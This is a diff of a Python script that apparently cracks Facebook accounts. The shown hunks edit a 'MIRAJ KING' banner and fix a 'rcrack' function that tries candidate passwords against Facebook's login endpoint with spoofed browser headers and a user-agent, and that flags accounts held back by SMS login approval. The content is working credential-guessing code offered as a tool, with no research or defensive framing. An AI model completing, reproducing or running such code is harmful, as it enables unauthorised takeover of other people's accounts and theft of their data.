@@ -167,7 +167,7 @@ logo =("""
 \t\033[38;5;46m║\033[38;5;46m██  ██  ██    ██       ██      ██    ██  ██  ██  ██      \33[38;5;196m\033[34;1m\033[38;5;46m\033[38;5;46m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
 \t\033[38;5;46m║\033[38;5;46m██      ██    ██    ██ ███████  ██████    ████   ███████ \33[38;5;196m\033[34;1m\033[38;5;46m\33[38;5;196m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
 \t\033[38;5;46m║\033[38;5;46m\33[38;5;196m\033[34;1m\033[38;5;46m\033[38;5;46m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
-\t\033[38;5;46m║\033[38;5;46m\33[38;5;196mM+K\033[34;1mMY LOVE\033[38;5;46m\33[38;5;196m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
+\t\033[38;5;46m║\033[38;5;46m\33[38;5;196mM+K\033[34;1mVERSION: 1.0\033[38;5;46m\33[38;5;196m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
 \t\033[38;5;46m╚══════════════════════════════════╝
                \033[38;5;50m𝗗𝗔𝗧𝗔 𝗪𝗢𝗥𝗞𝗜𝗡𝗚 𝗧𝗢𝗢𝗟𝗦💥💥
 \33[38;5;196m     ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46mMIRAJ KING\33[38;5;196m━━━━━━━━━━━━━━━━━━━━┓
@@ -263,7 +263,7 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = 'authority': 'mbasic.facebook.com',
+            header_freefb = {'authority': 'mbasic.facebook.com',
     'method': 'GET',
     'scheme':'https',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -280,7 +280,7 @@ def rcrack(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent':pro}
+    'user-agent':pro}    
             twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
             lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
